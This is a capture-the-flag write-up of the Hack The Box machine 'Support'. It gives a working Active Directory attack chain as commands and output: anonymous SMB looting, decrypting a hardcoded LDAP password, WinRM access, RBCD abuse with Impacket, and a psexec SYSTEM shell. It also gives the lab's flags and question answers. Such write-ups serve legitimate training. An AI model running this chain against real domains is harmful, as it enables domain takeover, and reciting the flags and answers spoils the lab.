# Hack The Box — Support

**Category:** Easy  
**System:** Windows / Active Directory  
**Resolution date:** 2026-05-03  
**Lab IP:** `10.129.230.181`  
**Domain:** `support.htb`  
**Host:** `dc` / `dc.support.htb`  
**Result:** user and root obtained

---

## 1. Case introduction

Support is a Windows machine focused on an Active Directory attack chain. The full path does not depend on web exploitation or a version-specific vulnerability, but on several exposure and configuration weaknesses that chain together very cleanly:

```text
Anonymous SMB
→ non-standard share
→ internal .NET tool
→ obfuscated LDAP credential
→ authenticated LDAP query
→ password in the info attribute
→ WinRM as a domain user
→ GenericAll over the DC object
→ Resource Based Constrained Delegation
→ Kerberos ticket as Administrator
→ shell as NT AUTHORITY\SYSTEM
```

The didactic value of this machine lies in reading evidence in an orderly way. Each phase provides a piece that justifies the next one. Root is not reached through brute force or random exploit attempts, but by correctly interpreting domain services, LDAP attributes, groups, ACLs, and Kerberos delegation.

### Final result

```text
user flag: f6702c2f5fc70621f8bc10403281d32f
root flag: 7fa548191c427443fb2d2dd0381450db
```

---

## 2. Preparation and startup

The lab was started with the custom `Inici-HTB` script, used to set the target, prepare the working tree, and launch the initial enumeration. This script does not exploit anything; its role is to keep the startup phase organized so later decisions are based on evidence rather than intuition.

Startup command:

```bash
Inici-HTB Support 10.129.230.181 easy
```

The initial check confirmed connectivity to the target:

```text
64 bytes from 10.129.230.181: icmp_seq=1 ttl=127 time=48.1 ms
```

The quick TTL-based estimate pointed to Windows:

```text
10.129.230.181 (ttl -> 127): Windows
```

This estimate is not treated as an absolute fact, but it guides the initial interpretation. In this case, it was immediately reinforced by the service scan, which showed a typical domain controller surface.

---

## 3. Initial port enumeration

The first full scan identified the open TCP ports:

```text
53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49676,49681,49701
```

A service scan was then launched against those ports. The relevant output was:

```text
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp  open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows
```

This was also observed:

```text
SMB signing enabled and required
```

### Technical reading

The combination of `53`, `88`, `389`, `445`, `464`, `636`, `3268`, `3269`, `5985`, and `9389` is a very strong Active Directory signal. Port `5985` appears as HTTP, but in this context it corresponds to WinRM over Microsoft HTTPAPI. A web branch was not opened because there was no business web application; port `5985` was a Windows remote administration component.

The dominant surface was classified as:

```text
AD / SMB / LDAP / Kerberos
```

Secondary branches were noted as follows:

```text
WinRM  → pending credentials
LDAP   → pending useful bind or credentials
Kerberos → pending valid users
HTTPAPI 5985 → auxiliary, not main web surface
```

### Reusable lesson

On Windows domain machines, not every HTTP response should trigger a web branch. If the port set clearly indicates a domain controller, priority should go to SMB, LDAP, Kerberos, and WinRM. Forcing `WEB-BASE` against a `Microsoft-HTTPAPI/2.0 Not Found` response would have been methodological noise.

---

## 4. Local name resolution

Before querying domain services, local resolution was added for the domain and the controller:

```bash
echo '10.129.230.181 support.htb dc.support.htb' | sudo tee -a /etc/hosts
```

Check:

```bash
getent hosts support.htb
getent hosts dc.support.htb
```

Output:

```text
10.129.230.181  support.htb dc.support.htb
10.129.230.181  support.htb dc.support.htb
```

### Why this mattered

In Active Directory, DNS and FQDNs are not decorative details. Kerberos, LDAP, WinRM, and Impacket may depend on the name used. Working only by IP can cause SPN, realm, or resolution errors that look like credential failures when they are actually context failures.

---

## 5. SMB enumeration

The first useful validation was listing SMB shares with an anonymous session:

```bash
smbclient -L //support.htb/ -N
```

The output showed six shares:

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
support-tools   Disk      support staff tools
SYSVOL          Disk      Logon server share
```

The later SMB1 message did not invalidate the enumeration:

```text
Unable to connect with SMB1 -- no workgroup available
```

The share list had already been obtained correctly through modern SMB. The error corresponded to the later attempt to list the workgroup using SMB1.

The result was also contrasted with `netexec`:

```bash
netexec smb 10.129.230.181 -u '' -p '' --shares
```

The tool confirmed the domain, host, and null authentication, although it failed while enumerating shares:

```text
Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
STATUS_ACCESS_DENIED
```

### Interpretation

The `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, and `SYSVOL` shares are expected on a domain controller. The resource that stood out was:

```text
support-tools
```

That name does not correspond to a standard share. Its comment also indicated that it contained support tools. The logical next step was listing its contents.

---

## 6. Inspecting the `support-tools` share

The share contents were listed:

```bash
smbclient //support.htb/support-tools -N -c 'ls' | tee scans/smb_support-tools_ls.txt
```

The first attempt produced a local `tee` error because the `scans` directory did not exist yet:

```text
tee: scans/smb_support-tools_ls.txt: No existe el fichero o el directorio
```

That error did not affect SMB or the remote listing. The useful output was:

```text
7-ZipPortable_21.07.paf.exe
npp.8.4.1.portable.x64.zip
putty.exe
SysinternalsSuite.zip
UserInfo.exe.zip
windirstat1_1_2_setup.exe
WiresharkPortable64_3.6.5.paf.exe
```

### Reading the result

Most files were well-known public tools: 7-Zip, Notepad++, PuTTY, Sysinternals, WinDirStat, and Wireshark. The file that did not fit with that group was:

```text
UserInfo.exe.zip
```

The reading was clear: the share mixed public installers with an internal utility. In an AD environment, a tool named `UserInfo` could contain user or LDAP query logic. It was downloaded for local analysis.

Download:

```bash
mkdir -p scans loot/smb_support-tools && smbclient //support.htb/support-tools -N -c 'get UserInfo.exe.zip loot/smb_support-tools/UserInfo.exe.zip'
```

Output:

```text
getting file \UserInfo.exe.zip of size 277499 as loot/smb_support-tools/UserInfo.exe.zip
```

### Reusable lesson

When a share contains many public tools and one custom artifact, the internal file is usually more valuable than the large installers. The question is not only “what can I download”, but also “which file does not fit with the rest”.

---

## 7. Local artifact validation

Before executing or decompiling anything, type, hash, and ZIP contents were recorded:

```bash
file loot/smb_support-tools/UserInfo.exe.zip
sha256sum loot/smb_support-tools/UserInfo.exe.zip
unzip -l loot/smb_support-tools/UserInfo.exe.zip
```

Key results:

```text
Zip archive data, at least v2.0 to extract, compression method=deflate
```

```text
e070ce95a8b30e126d7ae1803ea15c5a8e7d27b13fc670b3aaa69d7026c2bc97  loot/smb_support-tools/UserInfo.exe.zip
```

Relevant contents:

```text
UserInfo.exe
CommandLineParser.dll
Microsoft.Bcl.AsyncInterfaces.dll
Microsoft.Extensions.DependencyInjection.Abstractions.dll
Microsoft.Extensions.DependencyInjection.dll
Microsoft.Extensions.Logging.Abstractions.dll
System.Buffers.dll
System.Memory.dll
System.Numerics.Vectors.dll
System.Runtime.CompilerServices.Unsafe.dll
System.Threading.Tasks.Extensions.dll
UserInfo.exe.config
```

The ZIP contained twelve files and the main binary was `UserInfo.exe`.

### Extraction and binary type

```bash
rm -rf loot/smb_support-tools/UserInfo_extracted && mkdir -p loot/smb_support-tools/UserInfo_extracted && unzip -q loot/smb_support-tools/UserInfo.exe.zip -d loot/smb_support-tools/UserInfo_extracted && file loot/smb_support-tools/UserInfo_extracted/UserInfo.exe && ls -la loot/smb_support-tools/UserInfo_extracted
```

The `file` output confirmed:

```text
UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

### Interpretation

`UserInfo.exe` was a Windows `.NET` binary. This was very favorable for static analysis because `.NET` binaries often preserve useful class names, methods, namespaces, and strings. The binary was not executed directly as a first step; its configuration and strings were reviewed first.

---

## 8. Reviewing the binary configuration

The `UserInfo.exe.config` file was read:

```bash
cat loot/smb_support-tools/UserInfo_extracted/UserInfo.exe.config
```

Relevant content:

```xml
<?xml version="1.0" encoding="utf-8"?>
<configuration>
    <startup> 
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.8" />
    </startup>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="System.Runtime.CompilerServices.Unsafe" publicKeyToken="b03f5f7f11d50a3a" culture="neutral" />
        <bindingRedirect oldVersion="0.0.0.0-6.0.0.0" newVersion="6.0.0.0" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
</configuration>
```

The `.config` file did not contain credentials, endpoints, or operational parameters. It only confirmed `.NET Framework v4.8` runtime and a `bindingRedirect`.

### Decision

The value was not in the configuration, but in the executable. The next action was extracting relevant strings from the binary.

---

## 9. Extracting strings from `UserInfo.exe`

ASCII and UTF-16LE strings were searched:

```bash
{ echo '[ASCII strings]'; strings -a loot/smb_support-tools/UserInfo_extracted/UserInfo.exe; echo '[UTF-16LE strings]'; strings -a -el loot/smb_support-tools/UserInfo_extracted/UserInfo.exe; } | tee loot/smb_support-tools/UserInfo_extracted/UserInfo.exe.strings.txt | grep -Ei 'ldap|support|password|protected|getpassword|directory|armando|0Nv|enc_|userinfo|finduser|getuser'
```

Key output:

```text
Protected
getPassword
enc_password
DirectorySearcher
FindUser
GetUser
System.DirectoryServices
LdapQuery
DirectoryEntry
C:\Users\0xdf\source\repos\UserInfo\obj\Release\UserInfo.pdb
0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
armando
LDAP://support.htb
support\ldap
[*] LDAP query to use:
Last Password Change:
```

### Technical reading

This output was very rich. It allowed several facts to be stated:

- the binary used `System.DirectoryServices`;
- there was LDAP logic (`LdapQuery`, `DirectoryEntry`, `DirectorySearcher`);
- the LDAP server was `LDAP://support.htb`;
- the bind user was `support\ldap`;
- there was a `getPassword` function inside a `Protected` component;
- there was an `enc_password` variable;
- the protected string was `0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E`;
- the word `armando` appeared, which fit as an obfuscation key or seed.

### Discarded attempt: `monodis`

Disassembling the binary with `monodis` was considered, but the tool was not installed:

```text
zsh: command not found: monodis
```

It was not necessary to block the resolution at this point. With the observed strings and the known logic of the binary, the decryption was reproduced locally in Python. In the final document, `monodis` remains as an alternative method that was not used.

---

## 10. Recovering the LDAP password

The decryption was reproduced with Python:

```bash
python3 - << 'PY' | tee loot/smb_support-tools/UserInfo_extracted/ldap_password.txt
import base64

enc = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

raw = base64.b64decode(enc)

password = bytes(
    b ^ key[i % len(key)] ^ 223
    for i, b in enumerate(raw)
).decode()

print(password)
PY
```

Output:

```text
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

### Interpretation

The recovered credential was associated with the data observed in the binary:

```text
LDAP host:       support.htb
LDAP user:       support\ldap
LDAP password:   nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

The password was not assumed valid merely because it had been decrypted. The next step was validating it against LDAP.

---

## 11. LDAP bind validation

A minimal low-noise query was run to check authentication and base context:

```bash
ldapsearch -x \
  -H ldap://support.htb \
  -D 'support\ldap' \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -s base namingContexts defaultNamingContext
```

Output:

```text
defaultNamingContext: DC=support,DC=htb
namingContexts: DC=support,DC=htb
namingContexts: CN=Configuration,DC=support,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=support,DC=htb
namingContexts: DC=DomainDnsZones,DC=support,DC=htb
namingContexts: DC=ForestDnsZones,DC=support,DC=htb
result: 0 Success
```

### Reading the result

This result validated three points:

1. the recovered LDAP password was correct;
2. the LDAP server was the expected DC;
3. the domain base context was `DC=support,DC=htb`.

From here onward, the work was no longer based on a hypothesis, but on a functional LDAP credential.

---

## 12. Targeted query for the `support` user

LDAP was not dumped indiscriminately. A targeted search was performed for the `support` user, because the username was relevant to the machine and the expected path involved locating useful attributes.

```bash
mkdir -p loot/ldap && ldapsearch -x \
  -H ldap://support.htb \
  -D 'support\ldap' \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b 'DC=support,DC=htb' \
  '(&(objectClass=user)(sAMAccountName=support))' \
  sAMAccountName cn name description info memberOf userPrincipalName distinguishedName \
  | tee loot/ldap/support_user.ldif
```

Relevant output:

```text
dn: CN=support,CN=Users,DC=support,DC=htb
cn: support
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
name: support
sAMAccountName: support
result: 0 Success
```

### Interpretation

The attribute that stood out was:

```text
info: Ironside47pleasure40Watchful
```

`info` is not a password attribute, but it contained a string with a clear password-like format. In addition, the `support` user belonged to `Remote Management Users`, a group that allows WinRM access if the credential is valid.

Membership in `Shared Support Accounts` was noted for the escalation phase, but at this point the immediate goal was validating remote access.

### Reusable lesson

In AD, a low-privilege LDAP credential can have high impact if it can read misused attributes. Seemingly descriptive fields such as `info` or `description` should not be ignored: sometimes they contain operational secrets.

---

## 13. WinRM access and user flag

With the password found in LDAP, WinRM access was validated:

```bash
evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
```

In the remote session:

```powershell
whoami
```

Output:

```text
support\support
```

Two minor errors were made due to switching from a Linux context to PowerShell:

```powershell
id
ls -la
```

Both failed because the session was PowerShell, not a Linux shell:

```text
The term 'id' is not recognized...
A parameter cannot be found that matches parameter name 'la'.
```

These mistakes did not affect the access. They serve as a reminder that shell context matters: Evil-WinRM provides PowerShell on Windows.

The user flag was read from the user's desktop:

```powershell
Get-Content C:\Users\support\Desktop\user.txt
```

Result:

```text
f6702c2f5fc70621f8bc10403281d32f
```

### User-phase closure

The chain up to user was validated as follows:

```text
Anonymous SMB
→ UserInfo.exe.zip
→ LDAP credential support\ldap
→ authenticated LDAP
→ info attribute of the support user
→ WinRM as support\support
→ user flag
```

---

## 14. Post-foothold enumeration

The escalation did not start by running random tools. Context was first established from the WinRM session:

```powershell
whoami /user
hostname
whoami /groups
```

Relevant output:

```text
User Name       SID
=============== =============================================
support\support S-1-5-21-1677581083-3380853377-188903654-1105
```

```text
hostname: dc
```

Relevant groups:

```text
BUILTIN\Remote Management Users
NT AUTHORITY\Authenticated Users
SUPPORT\Shared Support Accounts
```

### Interpretation

`Remote Management Users` explained WinRM access. `Authenticated Users` was relevant because, in many domains, it allows machine account creation if `ms-DS-MachineAccountQuota` is greater than zero. `Shared Support Accounts` was the non-standard group and became the escalation focus.

---

## 15. Validating `ms-DS-MachineAccountQuota`

The domain attribute defining how many machine accounts an authenticated user can create was queried:

```powershell
Get-ADObject -Identity ((Get-ADDomain).DistinguishedName) -Properties ms-DS-MachineAccountQuota | Select-Object DistinguishedName,ms-DS-MachineAccountQuota
```

Output:

```text
DistinguishedName ms-DS-MachineAccountQuota
----------------- -------------------------
DC=support,DC=htb                        10
```

### Technical reading

`ms-DS-MachineAccountQuota = 10` means authenticated users can create up to ten machine accounts in the domain. This does not grant root by itself, but it validates an important prerequisite for a Resource Based Constrained Delegation path.

---

## 16. Validating permissions over the `DC` object

It was checked whether the `Shared Support Accounts` group had permissions over the domain controller object:

```powershell
$dc = Get-ADComputer DC; Get-Acl ("AD:\" + $dc.DistinguishedName) | Select-Object -ExpandProperty Access | Where-Object { $_.IdentityReference -match "Shared Support Accounts" } | Select-Object IdentityReference,ActiveDirectoryRights,AccessControlType,InheritanceType
```

Output:

```text
IdentityReference               ActiveDirectoryRights AccessControlType InheritanceType
-----------------               --------------------- ----------------- ---------------
SUPPORT\Shared Support Accounts            GenericAll             Allow             All
```

### Interpretation

`GenericAll` over a computer object in AD implies full control over that object. Since the object was `DC`, and the `support` user belonged to the group with that permission, the main path became domain-permission abuse.

The validated chain was:

```text
support\support
→ Shared Support Accounts
→ GenericAll over DC
→ ability to modify attributes of the DC object
```

---

## 17. Initial state of the RBCD attribute

Before modifying the domain, the initial state of the relevant attributes was read:

```powershell
Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount,msDS-AllowedToActOnBehalfOfOtherIdentity | Select-Object Name,PrincipalsAllowedToDelegateToAccount,msDS-AllowedToActOnBehalfOfOtherIdentity
```

Output:

```text
Name PrincipalsAllowedToDelegateToAccount msDS-AllowedToActOnBehalfOfOtherIdentity
---- ------------------------------------ ----------------------------------------
DC   {}
```

### Why this was done

This read was not exploitation; it was traceability. Before changing a delegation attribute, it is useful to record its previous state. This makes it possible to demonstrate what was modified and avoids confusing a pre-existing configuration with a lab action.

---

## 18. Creating a controlled machine account

To prepare RBCD, a controlled machine account was required. The first attempt was mistakenly executed inside Evil-WinRM:

```powershell
addcomputer.py 'support.htb/support:Ironside47pleasure40Watchful' -dc-host dc.support.htb -computer-name 'R4M-SUP01$' -computer-pass 'R4mSup01Passw0rd!'
```

PowerShell replied:

```text
The term 'addcomputer.py' is not recognized as the name of a cmdlet...
```

### Reading the error

The error did not mean the technique failed. It meant that `addcomputer.py` or `impacket-addcomputer` belongs to the attacker environment, not to the DC's remote PowerShell. The command had to be executed from Parrot.

Correct execution from the attacker machine:

```bash
cd /home/r4mon/pentest/targets/HTB/easy/Support
impacket-addcomputer 'support.htb/support:Ironside47pleasure40Watchful' -dc-ip 10.129.230.181 -computer-name 'R4M-SUP01$' -computer-pass 'R4mSup01Passw0rd!'
```

Output:

```text
[*] Successfully added machine account R4M-SUP01$ with password R4mSup01Passw0rd!.
```

### AD validation

From Evil-WinRM, the account was checked:

```powershell
Get-ADComputer -Identity 'R4M-SUP01' -Properties SamAccountName,ObjectSID | Select-Object Name,SamAccountName,ObjectSID
```

Output:

```text
Name      SamAccountName ObjectSID
----      -------------- ---------
R4M-SUP01 R4M-SUP01$     S-1-5-21-1677581083-3380853377-188903654-6101
```

---

## 19. Configuring Resource Based Constrained Delegation

With the machine account created and validated, RBCD was configured on the `DC` object:

```powershell
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount 'R4M-SUP01$'
```

The command did not return output, which is normal in PowerShell when no error occurs. Therefore, the change was verified by reading the attribute:

```powershell
Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount | Select-Object Name,PrincipalsAllowedToDelegateToAccount
```

Output:

```text
Name PrincipalsAllowedToDelegateToAccount
---- ------------------------------------
DC   {CN=R4M-SUP01,CN=Computers,DC=support,DC=htb}
```

### Interpretation

The DC now allowed the `R4M-SUP01$` account to act in the configured delegation context. This was the central RBCD piece.

The validated chain was:

```text
R4M-SUP01$ created
→ GenericAll allows modifying DC
→ DC authorizes R4M-SUP01$ for delegation
→ an S4U ticket can be requested for a DC SPN
```

---

## 20. Obtaining the Kerberos ticket as Administrator

From the attacker machine, a service ticket was requested for `cifs/dc.support.htb`, impersonating `Administrator` with the controlled machine account:

```bash
cd /home/r4mon/pentest/targets/HTB/easy/Support
impacket-getST -dc-ip 10.129.230.181 -spn cifs/dc.support.htb -impersonate Administrator 'support.htb/R4M-SUP01$:R4mSup01Passw0rd!'
```

Output:

```text
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

### Technical reading

`S4U2self` and `S4U2Proxy` indicate that the required Kerberos sequence was completed. The important result was:

```text
Administrator.ccache
```

That file contained Kerberos material that Impacket could use to authenticate without a password via `-k -no-pass`.

---

## 21. Using the ticket with Impacket and SYSTEM shell

The first attempt to use the ticket was mistakenly launched inside Evil-WinRM:

```powershell
KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass support.htb/Administrator@dc.support.htb
```

PowerShell replied:

```text
The term 'KRB5CCNAME=Administrator.ccache' is not recognized...
```

### Reading the error

`KRB5CCNAME=...` is Linux shell syntax for setting an environment variable while running a command. It does not belong to remote PowerShell. Also, `Administrator.ccache` was on the attacker machine, not on the DC.

Correct execution from Parrot:

```bash
cd /home/r4mon/pentest/targets/HTB/easy/Support
KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass -dc-ip 10.129.230.181 support.htb/Administrator@dc.support.htb
```

Relevant output:

```text
[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file BBmdYhom.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service Vfxw on dc.support.htb.....
[*] Starting service Vfxw.....
Microsoft Windows [Version 10.0.20348.859]
C:\Windows\system32>
```

Identity and host were confirmed:

```cmd
whoami
hostname
```

Output:

```text
nt authority\system
dc
```

---

## 22. Root flag

From the SYSTEM shell, the administrator flag was read:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

Result:

```text
7fa548191c427443fb2d2dd0381450db
```

The machine was solved with an administrative shell on the domain controller.

---

## 23. Final technical summary

### Complete validated chain

```text
1. Inici-HTB confirms Windows host and AD surface.
2. Nmap shows a DC with DNS, Kerberos, LDAP, SMB, Global Catalog, WinRM, and ADWS.
3. support.htb and dc.support.htb are added to /etc/hosts.
4. Anonymous SMB allows share listing.
5. support-tools stands out as a non-standard share.
6. support-tools contains UserInfo.exe.zip.
7. The ZIP is downloaded and validated.
8. UserInfo.exe is identified as a .NET binary.
9. UserInfo.exe.config contains no secrets.
10. strings reveals LDAP://support.htb, support\ldap, enc_password, armando, and getPassword.
11. The Base64 + XOR decryption is reproduced with Python.
12. The LDAP password is recovered.
13. LDAP bind works and returns DC=support,DC=htb.
14. LDAP reveals info: Ironside47pleasure40Watchful for the support user.
15. support belongs to Remote Management Users.
16. Evil-WinRM confirms access as support\support.
17. user.txt is obtained.
18. whoami /groups confirms Shared Support Accounts and Authenticated Users.
19. ms-DS-MachineAccountQuota = 10.
20. Shared Support Accounts has GenericAll over DC.
21. The DC RBCD attribute is empty.
22. The R4M-SUP01$ machine account is created.
23. PrincipalsAllowedToDelegateToAccount is configured on DC.
24. Administrator.ccache is obtained with impacket-getST.
25. KRB5CCNAME is used with impacket-psexec.
26. A shell as nt authority\system is obtained.
27. root.txt is obtained.
```

### Flags

```text
user.txt: f6702c2f5fc70621f8bc10403281d32f
root.txt: 7fa548191c427443fb2d2dd0381450db
```

---

## 24. Lab questions answered

During the resolution, intermediate lab tasks were answered:

```text
How many shares is Support showing on SMB?
Answer: 6
```

```text
Which share is not a default share for a Windows domain controller?
Answer: support-tools
```

```text
Almost all of the files in this share are publicly available tools, but one is not. What is the name of that file?
Answer: UserInfo.exe.zip
```

```text
What is the hardcoded password used for LDAP in the UserInfo.exe binary?
Answer: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

```text
Which field in the LDAP data for the user named support stands out as potentially holding a password?
Answer: info
```

```text
What open port on Support allows a user in the Remote Management Users group to run PowerShell commands and get an interactive shell?
Answer: 5985
```

```text
Bloodhound data will show that the support user has what privilege on the DC.SUPPORT.HTB object?
Answer: GenericAll
```

```text
A common attack with generic all on a computer object is to add a fake computer to the domain. What attribute on the domain sets how many computer accounts a user is allowed to create in the domain?
Answer: ms-ds-machineaccountquota
```

```text
What is the name of the script from Impacket that can convert that ticket to ccache format?
Answer: ticketConverter.py
```

```text
What is the name of the environment variable on our local system that we'll set to that ccache file to allow use of files like psexec.py with the -k and -no-pass options?
Answer: KRB5CCNAME
```

---

## 25. Reusable lessons

### 25.1. A domain controller is recognized by the set, not by an isolated port

The simultaneous presence of DNS, Kerberos, LDAP, SMB, Global Catalog, WinRM, and ADWS carries much more weight than any isolated signal. In Support, port `5985` did not justify opening a web branch; it was WinRM.

### 25.2. Anonymous SMB remains a critical source of context

Share exposure does not always provide credentials directly. In this case, it provided an internal tool. That tool became the bridge to LDAP.

### 25.3. In a tools share, what matters is usually what does not fit

`UserInfo.exe.zip` stood out because it was not a public tool. That anomaly criterion allowed it to be prioritized over larger installers with lower offensive value.

### 25.4. Small .NET binaries are excellent candidates for static analysis

`strings` revealed enough information to guide the analysis: LDAP user, LDAP host, password function, protected string, and key. Although tools such as ILSpy or `monodis` can provide more precision, they are not always required to progress if the evidence is already clear and later validated against the real service.

### 25.5. A credential does not count until it is validated

The password recovered from the binary was not treated as a valid credential until `ldapsearch` returned `result: 0 Success` and the correct `defaultNamingContext`.

### 25.6. Descriptive LDAP attributes can contain secrets

The `info` field of the `support` user contained a reusable password. This shows that LDAP enumeration should review attributes such as `info`, `description`, `memberOf`, `servicePrincipalName`, and other context fields.

### 25.7. AD escalation should be validated by prerequisites

The RBCD path was built by accumulating evidence:

```text
support in Authenticated Users
→ MachineAccountQuota = 10
→ support in Shared Support Accounts
→ GenericAll over DC
→ empty RBCD attribute
→ machine account creation
→ delegation configuration
→ S4U ticket
```

Each piece was validated before moving to the next.

### 25.8. Execution context matters

Two errors were didactically useful:

- attempting to run `impacket-addcomputer` inside Evil-WinRM;
- attempting to use `KRB5CCNAME=...` inside PowerShell.

Both mistakes teach the same lesson: tools and environment variables must be executed in the correct environment. Impacket and `KRB5CCNAME` belong to the Linux attacker machine; Evil-WinRM is a remote PowerShell session.

### 25.9. In Kerberos, the FQDN and SPN matter

The ticket was requested for:

```text
cifs/dc.support.htb
```

Therefore, later use had to refer to the FQDN `dc.support.htb`. Using an IP or inconsistent names can break Kerberos authentication even when the ticket is valid.

---

## 26. Editorial corrections applied

Minor editorial corrections were applied to the main body:

- The initial heading `Iniciasmos` was corrected to `Iniciamos` in the consolidated narrative.
- `support.htb0.` was treated as residual output or an Nmap presentation artifact, using `support.htb` as the domain validated by resolution and services.
- The `monodis` attempt was preserved as an unused alternative method, because the tool was not installed.
- Context errors (`addcomputer.py` inside PowerShell and `KRB5CCNAME=...` inside Evil-WinRM) were kept as operational learning points.
- The original notes are preserved at the end without global rewriting, to maintain traceability.

---


## Annex A — original notes preserved

From this point onward, the original working material is preserved as lab traceability. The main body above consolidates and cleans up the resolution; this annex keeps the original narrative and operational evidence.

A partir de aquí se conserva el material original de trabajo como trazabilidad del laboratorio. El cuerpo principal anterior consolida y limpia la resolución; este anexo mantiene la evidencia narrativa y operativa original.

### Iniciasmos la explotación de la máquina Support de Hack The Box.

### Síntesis:

Support es una máquina Windows easy centrada en una cadena de ataque sobre Active Directory. El escenario combina enumeración de recursos accesibles, análisis de información obtenida desde LDAP, acceso remoto con credenciales reutilizables y una fase de post-explotación orientada al estudio de privilegios y relaciones dentro del dominio. Su valor principal está en que permite practicar una progresión técnica muy clara desde reconocimiento inicial hasta escalada completa mediante abuso de delegación.

# Modelo de inicio — Ejecución de `Inici-HTB`

## Preparación inicial automatizada

Al comenzar la máquina se ejecuta el script propio `Inici-HTB`, utilizado para preparar el entorno de trabajo y realizar una primera enumeración técnica controlada.

```bash
Inici-HTB <NOMBRE_MAQUINA> <IP_OBJETIVO>
```

Este script no explota nada. Su función es dejar el laboratorio ordenado desde el primer minuto, validar conectividad y generar una base mínima de evidencias para decidir la siguiente rama de trabajo.

---

## Qué prepara el script

`Inici-HTB` crea una estructura de trabajo separada para la máquina, con directorios destinados a organizar la enumeración, el contenido descargado, posibles pruebas posteriores y notas del caso.

Estructura genérica esperada:

```text
<directorio_maquina>/
├── content/
├── exploits/
├── nmap/
│   ├── allPorts
│   ├── extractPorts.txt
│   ├── nmap_tcp_services.txt
│   ├── ping.txt
│   └── whichSystem.txt
└── notes/
    ├── 00_resumen_inicial.md
    └── 01_siguiente_paso.txt
```

---

## Finalidad de cada directorio

### `content/`

Directorio reservado para material obtenido durante la enumeración o el análisis posterior:

- páginas descargadas;
- ficheros públicos;
- respuestas HTTP;
- artefactos útiles;
- resultados de herramientas específicas;
- documentación o evidencias relevantes.

### `exploits/`

Directorio reservado para pruebas o material de explotación usado por el operador del laboratorio, cuando proceda.

No se utiliza en la fase inicial salvo que más adelante se confirme una vía concreta y justificada.

### `nmap/`

Directorio donde se guardan las evidencias de conectividad y enumeración inicial.

Archivos principales:

- `ping.txt`  
  Guarda la comprobación inicial de conectividad contra la IP objetivo.

- `whichSystem.txt`  
  Guarda la estimación inicial del sistema operativo, normalmente a partir de TTL u otras señales tempranas.

- `allPorts`  
  Guarda el resultado del escaneo completo de puertos TCP abiertos.

- `extractPorts.txt`  
  Guarda la extracción de puertos abiertos para reutilizarlos en el escaneo de servicios.

- `nmap_tcp_services.txt`  
  Guarda el escaneo detallado de servicios, versiones y scripts básicos sobre los puertos abiertos.

### `notes/`

Directorio donde se crean notas iniciales del caso.

Archivos generados:

- `00_resumen_inicial.md`  
  Resume los datos iniciales de la máquina: IP, fecha, sistema estimado, puertos abiertos, servicios detectados, superficie dominante sugerida, ramas secundarias y siguiente paso único.

- `01_siguiente_paso.txt`  
  Guarda de forma aislada el siguiente paso recomendado para continuar con el roadmap correspondiente.

---

## Qué ejecuta el script de forma resumida

El flujo automatizado realiza estas acciones:

1. registra el objetivo de trabajo;
2. prepara el árbol de directorios;
3. valida conectividad con `ping`;
4. estima el sistema operativo con `whichSystem.py`;
5. ejecuta un escaneo completo de puertos TCP;
6. extrae los puertos abiertos;
7. ejecuta un escaneo de servicios sobre esos puertos;
8. infiere una superficie dominante inicial;
9. propone ramas secundarias;
10. genera un resumen inicial;
11. deja escrito un siguiente paso único.

---

## Lectura didáctica del arranque

El objetivo de esta fase no es encontrar ya la vulnerabilidad principal, sino evitar empezar el caso de forma desordenada.

La ejecución de `Inici-HTB` permite responder rápidamente a preguntas básicas:

- ¿el objetivo responde?
- ¿qué puertos están abiertos?
- ¿qué servicios están expuestos?
- ¿hay una web dominante?
- ¿parece un entorno Linux o Windows?
